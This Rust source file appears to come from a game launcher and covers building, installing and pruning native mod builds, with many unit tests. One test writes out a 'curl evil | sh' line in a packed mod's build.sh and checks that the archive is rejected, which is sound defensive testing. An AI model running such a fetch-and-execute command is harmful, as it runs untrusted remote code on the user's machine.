        let real = plain(root().canonicalize().map_err(|e| e.to_string())?);
        let fresh = real.join("stage.new");
        let _ = fs::remove_dir_all(&fresh);
        run(
            apply(&rust, &tool, &source, &incoming, &fresh),
            "horizon-mixins",
            |_| {},
        )
        .map_err(blame)?;
        // Absolute: the compiler runs from elsewhere (`compile`).
        let stage = real.join("stage");
        sync(&fresh, &stage)?;
        let _ = fs::remove_dir_all(&fresh);
        let target = real.join("target");
        let profile = profile_of(&stage);
        let mut crates = 0;
        run(
            compile(&rust, &stage, &target),
            "Compiling the game",
            |line| {
                if let Some(name) = line.trim_start().strip_prefix("Compiling ") {
                    crates += 1;
                    let name = name.split_whitespace().next().unwrap_or(name);
                    progress(Step::Compile(crates, name.to_owned()));
                }
            },
        )
        .map_err(blame)?;
        progress(Step::Install);
        let about = serde_json::json!({
            "base": origin,
            "horizon": revision,
            "horizon_mixins": mixins,
            "hooks": mods.iter().find_map(|m| m.hooks),
            "rust": rust_toolchain::VERSION,
            "profile": profile,
            "mods": mods.iter().map(|m| serde_json::json!({"id": m.id, "version": m.version})).collect::<Vec<_>>(),
        });
        let binary = target.join(profile).join(backend::CLIENT);
        install(base, &version, &binary, &about)?;
    } else {
        // Used again: it counts as the newest of the builds kept (`prune`).
        let _ = fs::write(backend::version_dir(&version).join(".installed"), "");
    }
    instances::edit(&instance.id, |meta| meta.version = Some(version.clone()))?;
    prune(&version);
    let _ = fs::remove_dir_all(&incoming);
    Ok(version)
}

/// Installs `binary` as version `version`: a copy of installed version `base`'s folder (its
/// resources included; cloned where the disk can) with the built game in place of `base`'s.
fn install(
    base: &str,
    version: &str,
    binary: &Path,
    about: &serde_json::Value,
) -> Result<(), String> {
    let from = backend::version_dir(base);
    let partial = backend::version_dir(&format!(".{version}.partial"));
    let _ = fs::remove_dir_all(&partial);
    fs::create_dir_all(&partial).map_err(|e| e.to_string())?;
    for entry in fs::read_dir(&from).map_err(|e| e.to_string())?.flatten() {
        let name = entry.file_name();
        if [
            backend::CLIENT,
            ".installed",
            "Horizon.app",
            "native-mods.json",
        ]
        .iter()
        .any(|n| name == *n)
        {
            continue;
        }
        let to = partial.join(&name);
        let copied = if entry.path().is_dir() {
            backend::copy_dir(&entry.path(), &to)
        } else {
            // A clone is a new file: horizon-ctl and horizon-server keep their permissions.
            horizon_prepare::clone_or_copy(&entry.path(), &to)
                .and_then(|()| fs::set_permissions(&to, entry.metadata()?.permissions()))
        };
        copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
    }
    let client = partial.join(backend::CLIENT);
    fs::copy(binary, &client).map_err(|e| format!("The built game: {e}"))?;
    fs::write(partial.join("native-mods.json"), about.to_string()).map_err(|e| e.to_string())?;
    let dir = backend::version_dir(version);
    let _ = fs::remove_dir_all(&dir);
    fs::rename(&partial, &dir).map_err(|e| e.to_string())?;
    fs::write(dir.join(".installed"), "").map_err(|e| e.to_string())
}

/// How many native builds no instance plays stay installed, the newest first: switching a mod
/// off and on again plays the kept build again, without compiling.
const SPARE_BUILDS: usize = 3;

/// Removes the native builds no instance plays, but `keep` and the [`SPARE_BUILDS`] newest. The
/// compiled crates (`native/target`) stay, so the next build only compiles what changed.
pub fn prune(keep: &str) {
    let played: Vec<String> = instances::list()
        .into_iter()
        .filter_map(|i| i.version)
        .collect();
    let builds = backend::installed()
        .into_iter()
        .filter(|v| is_native(v))
        .map(|v| {
            let made = fs::metadata(backend::version_dir(&v).join(".installed"))
                .and_then(|m| m.modified())
                .unwrap_or(std::time::UNIX_EPOCH);
            (v, made)
        })
        .collect();
    for old in stale(builds, keep, &played) {
        let _ = backend::remove(&old);
    }
}

/// The native `builds` (with when each was made or last used) to remove: those no instance plays
/// (`played`), other than `keep`, past the [`SPARE_BUILDS`] newest.
fn stale(
    mut builds: Vec<(String, std::time::SystemTime)>,
    keep: &str,
    played: &[String],
) -> Vec<String> {
    builds.retain(|(v, _)| v != keep && !played.contains(v));
    builds.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    builds
        .into_iter()
        .skip(SPARE_BUILDS)
        .map(|(v, _)| v)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Ludovic's decision (2026-10-29): installing a native mod turns Native mods on, after a
    /// notice shown once; players who never install one keep them off.
    #[test]
    fn installing_a_native_mod_turns_native_mods_on() {
        let entry = |file: &str| {
            serde_json::from_value::<crate::browser::installed::Entry>(serde_json::json!({
                "source": "horizon", "project": "p", "slug": "p", "title": "P", "kind": "mod",
                "version": "1", "number": "1", "file": file, "checksum": "", "page": ""
            }))
            .unwrap()
        };
        let plain = [
            entry("horizon-mods/zoom.hmod"),
            entry("resourcepacks/x.zip"),
        ];
        assert!(!turns_on(false, &[]));
        assert!(!turns_on(false, &plain), "no native mod: they stay off");
        assert!(!turns_on(
            false,
            &[entry("horizon-native-mods-old/x.hnmod")]
        ));
        let native = [
            plain[0].clone(),
            entry("horizon-native-mods/veinminer.hnmod"),
        ];
        assert!(turns_on(false, &native));
        assert!(turns_on(true, &plain), "on stays on");
        // The notice: before the first one only.
        assert!(needs_notice(false, false));
        assert!(!needs_notice(false, true));
        assert!(!needs_notice(true, false));
        // Settings without the fields read as off and not noticed.
        let s: backend::Settings = serde_json::from_str("{}").unwrap();
        assert!(!s.native_mods && !s.native_mods_noticed);
    }

    fn dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    fn write_bundle(at: &Path, id: &str, helper: &str) {
        fs::create_dir_all(at).unwrap();
        let manifest = format!("[mod]\nid = \"{id}\"\nversion = \"0.1.0\"\n");
        fs::write(at.join(MANIFEST), manifest).unwrap();
        fs::write(at.join("hook.rs"), helper).unwrap();
    }

    #[test]
    fn a_canonical_windows_path_loses_only_a_drives_verbatim_prefix() {
        let plain = |p: &str| plain(PathBuf::from(p));
        assert_eq!(
            plain(r"\\?\C:\Users\me\AppData\Roaming\horizon-launcher\native"),
            PathBuf::from(r"C:\Users\me\AppData\Roaming\horizon-launcher\native")
        );
        // A share has no drive form to fall back to; other paths have no prefix.
        assert_eq!(
            plain(r"\\?\UNC\server\share\native"),
            PathBuf::from(r"\\?\UNC\server\share\native")
        );
        assert_eq!(
            plain("/home/me/.local/share/horizon-launcher/native"),
            PathBuf::from("/home/me/.local/share/horizon-launcher/native")
        );
    }

    #[test]
    fn horizon_mixins_finds_the_launchers_cargo() {
        let rust = Toolchain {
            dir: PathBuf::from("/rust/1.99.1-x"),
        };
        let cmd = apply(
            &rust,
            Path::new("/tools/horizon-mixins"),
            Path::new("/src"),
            Path::new("/mods"),
            Path::new("/out"),
        );
        let path = cmd
            .get_envs()
            .find(|(k, _)| *k == "PATH")
            .and_then(|(_, v)| v)
            .unwrap();
        assert_eq!(
            std::env::split_paths(path).next(),
            Some(rust.dir.join("bin"))
        );
        assert_eq!(
            cmd.get_args().collect::<Vec<_>>(),
            [
                "apply",
                "--workspace",
                "/src",
                "--mods",
                "/mods",
                "--out",
                "/out"
            ]
        );
    }

    #[test]
    fn a_folder_is_one_bundle_or_a_folder_of_them() {
        let one = dir("one");
        write_bundle(&one, "hello", "fn hook() {}");
        let found = bundles(&one).unwrap();
        assert_eq!(
            (found[0].id.as_str(), found[0].version.as_str()),
            ("hello", "0.1.0")
        );
        let many = dir("many");
        write_bundle(&many.join("b"), "beta", "fn hook() {}");
        write_bundle(&many.join("a"), "alpha", "fn hook() {}");
        fs::create_dir_all(many.join("notes")).unwrap();
        let ids: Vec<String> = bundles(&many).unwrap().into_iter().map(|b| b.id).collect();
        assert_eq!(ids, ["alpha", "beta"]);
        assert!(bundles(&many.join("notes")).is_err());
    }

    const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    /// An unpacked `.hnmod`, as the registry ships one (horizon_mods::index::native).
    fn write_native(at: &Path, id: &str, horizon: &str, mixins: &str) {
        let manifest = serde_json::json!({"schema": 1, "id": id, "version": "0.3.0", "game": "26.3",
            "horizon": horizon, "mixins": mixins});
        fs::create_dir_all(at.join("mixins").join(id)).unwrap();
        fs::write(at.join(NATIVE_MANIFEST), manifest.to_string()).unwrap();
        let toml = format!("[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n");
        fs::write(at.join("mixins").join(id).join(MANIFEST), toml).unwrap();
    }

    #[test]
    fn a_registry_download_is_a_bundle_with_its_pins() {
        let d = dir("hnmod");
        write_native(&d.join("veinminer"), "veinminer", A, B);
        write_bundle(&d.join("local"), "hello", "fn hook() {}");
        let found = bundles(&d).unwrap();
        assert_eq!(found.len(), 2);
        assert_eq!(found[1].id, "veinminer");
        assert_eq!(found[1].dir, d.join("veinminer/mixins/veinminer"));
        assert_eq!(found[1].horizon.as_deref(), Some(A));
        assert_eq!(found[1].mixins.as_deref(), Some(B));
        assert_eq!(
            (found[0].horizon.as_ref(), found[0].mixins.as_ref()),
            (None, None)
        );
    }

    #[test]
    fn installed_mods_are_the_checked_files_of_those_turned_on() {
        let d = dir("installed-src");
        write_native(&d, "veinminer", A, B);
        let home = dir("installed-home");
        fs::create_dir_all(home.join(INSTALLED)).unwrap();
        let pack = |name: &str, extra: Option<(&str, &str)>| {
            let mut zip =
                zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
            let options = zip::write::SimpleFileOptions::default();
            for file in [NATIVE_MANIFEST, "mixins/veinminer/horizon-mixin.toml"] {
                zip.start_file(file, options).unwrap();
                zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
            }
            if let Some((file, body)) = extra {
                zip.start_file(file, options).unwrap();
                zip.write_all(body.as_bytes()).unwrap();
            }
            zip.finish().unwrap();
        };
        pack("veinminer.hnmod", None);
        assert!(installed_mods(&home).is_err(), "off until turned on");
        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
        let out = installed_mods(&home).unwrap();
        let found = bundles(&out).unwrap();
        assert_eq!(
            (found[0].id.as_str(), found[0].horizon.as_deref()),
            ("veinminer", Some(A))
        );
        pack(
            "veinminer.hnmod",
            Some(("mixins/veinminer/data/table.bin", "data")),
        );
        let out = installed_mods(&home).unwrap();
        let path = out.join("veinminer/mixins/veinminer/data/table.bin");
        assert_eq!(fs::read(&path).unwrap(), b"data");
        let first = version_for(A, B, &bundles(&out).unwrap()).unwrap();
        fs::write(path, b"changed").unwrap();
        assert_ne!(first, version_for(A, B, &bundles(&out).unwrap()).unwrap());
        pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
    }

    #[test]
    fn the_mods_of_one_build_pin_one_revision() {
        let pinned = |id: &str, horizon: Option<&str>| Bundle {
            id: id.into(),
            version: "1".into(),
            dir: PathBuf::new(),
            horizon: horizon.map(str::to_owned),
            mixins: None,
            hooks: None,
        };
        let never = || -> Result<String, String> { panic!("a pin wins") };
        fn get(b: &Bundle) -> Option<&String> {
            b.horizon.as_ref()
        }
        let same = [
            pinned("a", Some(A)),
            pinned("b", None),
            pinned("c", Some(A)),
        ];
        assert_eq!(agreed(&same, "Horizon", get, never).unwrap(), A);
        let none = [pinned("a", None)];
        assert_eq!(agreed(&none, "Horizon", get, || Ok(B.into())).unwrap(), B);
        let split = [pinned("veinminer", Some(A)), pinned("minimap", Some(B))];
        let err = agreed(&split, "Horizon", get, never).unwrap_err();
        assert!(
            err.contains("veinminer → aaaaaaa") && err.contains("minimap → bbbbbbb"),
            "{err}"
        );
        let bad = [pinned("a", Some("nightly"))];
        assert!(agreed(&bad, "Horizon", get, never).is_err());
    }

    #[test]
    fn mods_made_for_different_revisions_build_on_the_newest() {
        let pinned = |id: &str, horizon: Option<&str>, mixins: Option<&str>| Bundle {
            id: id.into(),
            version: "1".into(),
            dir: PathBuf::new(),
            horizon: horizon.map(str::to_owned),
            mixins: mixins.map(str::to_owned),
            hooks: None,
        };
        let c = "c".repeat(40);
        // a is the oldest commit, then b, then c.
        let date = |r: &str| -> Result<String, String> {
            Ok(match &r[..1] {
                "a" => "2026-10-28T00:00:00Z",
                "b" => "2026-10-29T00:00:00Z",
                _ => "2026-10-30T00:00:00Z",
            }
            .into())
        };
        let never = || -> Result<String, String> { panic!("a pin wins") };
        fn horizon(b: &Bundle) -> Option<&String> {
            b.horizon.as_ref()
        }
        fn mixins(b: &Bundle) -> Option<&String> {
            b.mixins.as_ref()
        }
        let split = [
            pinned("veinminer", Some(B), Some(&c)),
            pinned("lookat", Some(A), Some(A)),
            pinned("zoom", None, None),
        ];
        assert_eq!(
            newest(&split, "Horizon", horizon, never, None, date).unwrap(),
            B
        );
        // horizon-mixins: never older than a pin, and the launcher's own when it is newer.
        assert_eq!(
            newest(&split, "horizon-mixins", mixins, never, Some(B), date).unwrap(),
            c
        );
        let older = [pinned("a", None, Some(A)), pinned("b", None, Some(B))];
        assert_eq!(
            newest(&older, "horizon-mixins", mixins, never, Some(&c), date).unwrap(),
            c
        );
        // One pin, or the same one everywhere: that pin, and no date is asked for.
        let no_date = |_: &str| -> Result<String, String> { panic!("no date needed") };
        let same = [pinned("a", Some(A), None), pinned("b", Some(A), None)];
        assert_eq!(
            newest(&same, "Horizon", horizon, never, None, no_date).unwrap(),
            A
        );
        let offline = |_: &str| -> Result<String, String> { Err("offline".into()) };
        let err = newest(&split, "Horizon", horizon, never, None, offline).unwrap_err();
        assert!(err.contains("offline"), "{err}");
        // What the player is shown: each mod made for another revision, and the build's.
        assert_eq!(
            mismatch(&split, B).unwrap(),
            "lookat → aaaaaaa; the build uses bbbbbbb"
        );
        assert_eq!(mismatch(&same, A), None);
        let hooked = [Bundle {
            hooks: Some(1),
            ..pinned("minimap", Some(A), None)
        }];
        assert_eq!(mismatch(&hooked, B), None, "hook mods follow the build");
    }

    #[test]
    fn a_commit_date_is_asked_once_and_kept() {
        let d = dir("commit-dates");
        let file = d.join(DATES);
        let ask = |_: &str, r: &str| -> Result<String, String> { Ok(format!("date of {r}")) };
        assert_eq!(
            remembered(&file, "acme/x", A, ask).unwrap(),
            format!("date of {A}")
        );
        let offline = |_: &str, _: &str| -> Result<String, String> { Err("offline".into()) };
        assert_eq!(
            remembered(&file, "acme/x", A, offline).unwrap(),
            format!("date of {A}")
        );
        // Another repo or revision isn't known yet.
        assert!(remembered(&file, "acme/y", A, offline).is_err());
        assert!(remembered(&file, "acme/x", B, offline).is_err());
        // A broken file is asked again and rewritten.
        fs::write(&file, "not json").unwrap();
        assert_eq!(
            remembered(&file, "acme/x", B, ask).unwrap(),
            format!("date of {B}")
        );
        assert_eq!(
            remembered(&file, "acme/x", B, offline).unwrap(),
            format!("date of {B}")
        );
    }

    #[test]
    fn mods_on_the_hook_points_follow_the_game_or_the_pins() {
        assert_eq!(
            hooks_in("x\npub(crate) const NATIVE_HOOKS_API: u32 = 3;\n"),
            Some(3)
        );
        assert_eq!(hooks_in("const NATIVE_HOOKS_API: u32 = 3;"), None);
        let mod_ = |id: &str, horizon: &str, hooks: Option<u32>| Bundle {
            id: id.into(),
            version: "1".into(),
            dir: PathBuf::new(),
            horizon: Some(horizon.into()),
            mixins: None,
            hooks,
        };
        let c = "c".repeat(40);
        // A (the game) has hook points v1, B v2, C none.
        let at = |r: &str| match r.as_bytes()[0] {
            b'a' => Some(1),
            b'b' => Some(2),
            _ => None,
        };
        let zoom = [mod_("zoom", B, Some(1)), mod_("minimap", &c, Some(1))];
        assert_eq!(
            with_hooks(&zoom, A.into(), true, at).unwrap(),
            A,
            "the game's own"
        );
        let tested = [mod_("zoom", A, Some(1))];
        assert_eq!(
            with_hooks(&tested, c.clone(), true, at).unwrap(),
            A,
            "an older game"
        );
        assert_eq!(
            with_hooks(&tested, B.into(), false, at).unwrap(),
            B,
            "v1 mods on v2"
        );
        let newer = [mod_("recipes", B, Some(2))];
        let err = with_hooks(&newer, A.into(), false, at).unwrap_err();
        assert!(
            err.contains("aaaaaaa") && err.contains("recipes (hook points v2)"),
            "{err}"
        );
        assert_eq!(
            with_hooks(&newer, A.into(), true, at).unwrap(),
            B,
            "its tested commit"
        );
        let pinned_only = [mod_("veinminer", B, None)];
        assert_eq!(with_hooks(&pinned_only, B.into(), false, at).unwrap(), B);
    }

    #[test]
    fn a_hooks_bundle_is_read_and_repinned_to_the_build() {
        let d = dir("hooks");
        write_native(&d, "zoom", A, B);
        let json = fs::read_to_string(d.join(NATIVE_MANIFEST)).unwrap();
        let json = json.replacen('}', ",\"hooks\":1}", 1);
        fs::write(d.join(NATIVE_MANIFEST), json).unwrap();
        let found = bundles(&d).unwrap();
        assert_eq!(
            (found[0].hooks, found[0].horizon.as_deref()),
            (Some(1), Some(A))
        );
        repin(&found[0], B).unwrap();
        let again = bundle(&found[0].dir, None).unwrap();
        assert_eq!(
            (again.id.as_str(), again.horizon.as_deref()),
            ("zoom", Some(B))
        );
    }

    #[test]
    fn the_version_changes_with_the_revision_and_any_file_of_the_mods() {
        let d = dir("key");
        write_bundle(&d, "hello", "fn hook() {}");
        let key =
            |revision: &str| version_for(revision, MIXINS_REV, &bundles(&d).unwrap()).unwrap();
        let first = key(A);
        assert!(
            first.starts_with("native-aaaaaaa-") && first.len() == "native-aaaaaaa-".len() + 12
        );
        assert!(is_native(&first) && !backend::is_game_tag(&first));
        assert_eq!(first, key(A));
        assert_ne!(first, key(B));
        assert_ne!(first, version_for(A, B, &bundles(&d).unwrap()).unwrap());
        fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
        assert_ne!(first, key(A));
    }

    #[test]
    fn only_changed_files_are_written_again() {
        let (from, to) = (dir("sync-from"), dir("sync-to"));
        fs::create_dir_all(from.join("src")).unwrap();
        fs::write(from.join("src/a.rs"), "a").unwrap();
        fs::write(from.join("src/b.rs"), "b2").unwrap();
        fs::create_dir_all(to.join("src")).unwrap();
        fs::write(to.join("src/a.rs"), "a").unwrap();
        fs::write(to.join("src/b.rs"), "b").unwrap();
        fs::write(to.join("gone.rs"), "x").unwrap();
        let before = fs::metadata(to.join("src/a.rs"))
            .unwrap()
            .modified()
            .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(20));
        sync(&from, &to).unwrap();
        assert_eq!(
            fs::metadata(to.join("src/a.rs"))
                .unwrap()
                .modified()
                .unwrap(),
            before
        );
        assert_eq!(fs::read_to_string(to.join("src/b.rs")).unwrap(), "b2");
        assert!(!to.join("gone.rs").exists());
    }

    /// levzzz5154's decision (2026-10-29): a rebuild stays on the Horizon the instance plays;
    /// only Update moves it to a newer one.
    #[test]
    fn a_rebuild_stays_on_the_instances_horizon_until_an_update() {
        let installed: Vec<String> = [
            "nightly-2026-10-29-4baa571",
            "v2026.10.20",
            "native-83f15fa-0123456789ab",
            "v2026.10.13",
        ]
        .map(String::from)
        .to_vec();
        let base = |current: Option<&str>, update| base_for(current, &installed, update);
        let native = "native-83f15fa-0123456789ab";
        assert_eq!(base(Some(native), false).as_deref(), Some(native));
        assert_eq!(
            base(Some("v2026.10.13"), false).as_deref(),
            Some("v2026.10.13")
        );
        let newest = Some("nightly-2026-10-29-4baa571");
        assert_eq!(base(Some(native), true).as_deref(), newest);
        assert_eq!(base(None, false).as_deref(), newest);
        assert_eq!(base(Some("native-gone"), false).as_deref(), newest);
        assert_eq!(base_for(Some(native), &[native.into()], true), None);
        // Update offers the newest release or Nightly, when newer than the build's own.
        assert_eq!(newer_than("v2026.10.20", &installed).as_deref(), newest);
        assert_eq!(newer_than("nightly-2026-10-29-4baa571", &installed), None);
        let releases = ["v2026.10.20".to_string(), "v2026.10.13".to_string()];
        assert_eq!(newer_than("v2026.10.20", &releases), None);
        assert_eq!(
            newer_than("v2026.10.13", &releases).as_deref(),
            Some("v2026.10.20")
        );
    }

    #[test]
    fn the_newest_builds_no_instance_plays_are_kept() {
        let at = |s: u64| std::time::UNIX_EPOCH + std::time::Duration::from_secs(s);
        let builds: Vec<(String, std::time::SystemTime)> = [
            ("native-a", 1),
            ("native-b", 6),
            ("native-c", 3),
            ("native-d", 5),
            ("native-e", 4),
            ("native-f", 2),
            ("native-g", 7),
        ]
        .map(|(v, s)| (v.to_string(), at(s)))
        .to_vec();
        // g was just built, b another instance plays: d, e and c are the newest spare ones.
        let mut gone = stale(builds.clone(), "native-g", &["native-b".into()]);
        gone.sort();
        assert_eq!(gone, ["native-a", "native-f"]);
        assert!(stale(builds[..4].to_vec(), "native-a", &[]).is_empty());
    }

    #[test]
    fn the_game_compiles_outside_the_players_cargo_configuration() {
        let rust = Toolchain {
            dir: PathBuf::from("/rust/1.99.1-x"),
        };
        let stage = dir("stage-config");
        let cmd = compile(&rust, &stage, Path::new("/native/target"));
        let args: Vec<String> = cmd
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            args[..3],
            [
                "build",
                "--manifest-path",
                &*stage.join("Cargo.toml").to_string_lossy()
            ]
        );
        assert!(
            args.ends_with(&["-p", "horizon-client", "--bin", "horizon-client"].map(String::from))
        );
        let dir = cmd.get_current_dir().expect("a folder of its own");
        assert!(
            dir.has_root() && dir.parent().is_none(),
            "{}",
            dir.display()
        );
        // The workspace's own configuration still applies.
        fs::create_dir_all(stage.join(".cargo")).unwrap();
        fs::write(stage.join(".cargo/config.toml"), "").unwrap();
        let cmd = compile(&rust, &stage, Path::new("/native/target"));
        let args: Vec<_> = cmd.get_args().collect();
        assert_eq!(args[1], "--config");
        assert_eq!(args[2], stage.join(".cargo/config.toml"));
    }

    #[test]
    fn builds_use_the_fast_profile_where_the_source_has_it() {
        let d = dir("profile");
        assert_eq!(profile_of(&d), "release");
        fs::write(d.join("Cargo.toml"), "[profile.release]\nlto = \"thin\"\n").unwrap();
        assert_eq!(profile_of(&d), "release");
        fs::write(
            d.join("Cargo.toml"),
            "[profile.release]\nlto = \"thin\"\n[profile.fast]\ninherits = \"release\"\n",
        )
        .unwrap();
        assert_eq!(profile_of(&d), "fast");
        let rust = Toolchain {
            dir: PathBuf::from("/rust/1.99.1-x"),
        };
        let cmd = compile(&rust, &d, Path::new("/native/target"));
        let args: Vec<_> = cmd.get_args().collect();
        assert!(args.windows(2).any(|w| w == ["--profile", "fast"]));
    }

    #[test]
    fn tool_errors_read_in_one_line() {
        let err = "{\n  \"code\": \"E_REVISION\",\n  \"message\": \"requires exact Horizon revision a\",\n  \"file\": \"m.toml\"\n}";
        assert_eq!(
            diagnostic(err).as_deref(),
            Some("E_REVISION: requires exact Horizon revision a (m.toml)")
        );
    }

    #[test]
    fn a_failed_build_names_the_crate_its_output_pushed_out() {
        // cargo's output on Linux without ALSA's development files (Rust 1.99.1, 2026-10-31):
        // the build script's report fills the last lines.
        let errors = ["error: failed to run custom build command for `alsa-sys v0.3.1`".to_owned()];
        let tail: Vec<String> = [
            "  The system library `alsa` required by crate `alsa-sys` was not found.",
            "  HINT: you may need to install a package such as alsa, alsa-dev or alsa-devel.",
            "warning: build failed, waiting for other jobs to finish...",
        ]
        .map(str::to_owned)
        .into();
        let e = failure("Compiling the game", "exit status: 101", &errors, &tail);
        assert!(e.starts_with("Compiling the game failed (exit status: 101). Its first errors"));
        assert!(
            e.ends_with(&format!("{}\n…\n{}", errors[0], tail.join("\n"))),
            "{e}"
        );
        // An error still among the last lines isn't said twice.
        let e = failure("horizon-mixins", "exit status: 1", &errors, &errors);
        assert!(e.contains("The end of its output") && e.matches("alsa-sys").count() == 1);
    }
}
